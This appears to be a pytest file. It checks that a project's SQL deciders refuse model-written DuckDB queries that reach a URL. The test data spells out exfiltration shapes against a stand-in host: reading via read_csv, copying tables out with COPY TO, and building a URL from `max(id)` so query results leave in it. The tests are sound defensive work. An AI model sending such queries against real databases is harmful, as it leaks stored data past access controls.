"""**M140.** Model-written SQL that reads or writes a URL is refused by both deciders.

Where DuckDB's `httpfs` is installed it fetches a URL for `read_csv('https://...')`, and a query
can carry data out in that URL (`... || (SELECT max(id) FROM claim)`). Under MNEMIQ_LOCAL_ONLY the
engine's connections cannot load `httpfs` at all (#92); everywhere, the deciders are what stands
between the model and the network. Measured 2026-10-10: every shape below is refused, and the
reason is worth pinning -- a table function reaches `check_access` as a table whose name is the
empty string, which no grant names. A change that skipped unnamed tables would leave nothing for
the check to refuse, and the query would pass as one over CTEs alone.
"""

import pytest

from mnemiq.authz.grants import GrantSet
from mnemiq.sql.decide import decide
from mnemiq.sql.decide_write import decide_write
from mnemiq.sql.policy import AccessPolicy
from mnemiq.sql.verdict import Refusal

_VISIBLE = {"claim": {"id", "amount"}}
_URL = "https://example.invalid/x.csv"

READS = {
    "a table function": f"SELECT a FROM read_csv('{_URL}')",
    "a string path": f"SELECT a FROM '{_URL}'",
    "parquet": "SELECT a FROM read_parquet('https://example.invalid/x.parquet')",
    "inside a CTE": f"WITH x AS (SELECT a FROM read_csv('{_URL}')) SELECT a FROM x",
    "in a projection subquery":
        f"SELECT id, (SELECT a FROM read_json('{_URL}') LIMIT 1) AS n FROM claim",
    "carrying data out in the URL":
        "SELECT id FROM claim WHERE id IN (SELECT a FROM read_csv("
        "'https://example.invalid/?v=' || (SELECT max(id) FROM claim)))",
    "copied out": f"COPY claim TO '{_URL}'",
}

WRITES = {
    "inserted from a URL": f"INSERT INTO claim (id, amount) SELECT a, b FROM read_csv('{_URL}')",
    "updated through a URL":
        "UPDATE claim SET amount = (SELECT max(a) FROM read_csv('https://example.invalid/?v=' || id))"
        " WHERE id = 1",
    "copied out": f"COPY (SELECT id FROM claim) TO '{_URL}'",
}


class _ExplainsAnything:
    def execute(self, sql):
        return []


@pytest.mark.parametrize("sql", READS.values(), ids=READS.keys())
def test_the_read_decider_refuses_sql_that_reaches_a_url(sql):
    assert isinstance(decide(sql, _VISIBLE, dialect="duckdb", target="duckdb"), Refusal)


@pytest.mark.parametrize("sql", WRITES.values(), ids=WRITES.keys())
def test_the_write_decider_refuses_sql_that_reaches_a_url(sql):
    verdict = decide_write(sql, _VISIBLE, GrantSet(frozenset(_VISIBLE), writable=frozenset({"claim"})),
                           adapter=_ExplainsAnything(), dialect="duckdb", writes_enabled=True,
                           policy=AccessPolicy())
    assert isinstance(verdict, Refusal)


def test_the_same_shapes_over_a_granted_table_are_approved():
    """The control: what is refused above is the URL, not the shape."""
    assert not isinstance(decide("SELECT id FROM claim", _VISIBLE, dialect="duckdb",
                                 target="duckdb"), Refusal)
    assert not isinstance(
        decide_write("UPDATE claim SET amount = 1 WHERE id = 1", _VISIBLE,
                     GrantSet(frozenset(_VISIBLE), writable=frozenset({"claim"})),
                     adapter=_ExplainsAnything(), dialect="duckdb", writes_enabled=True,
                     policy=AccessPolicy()), Refusal)
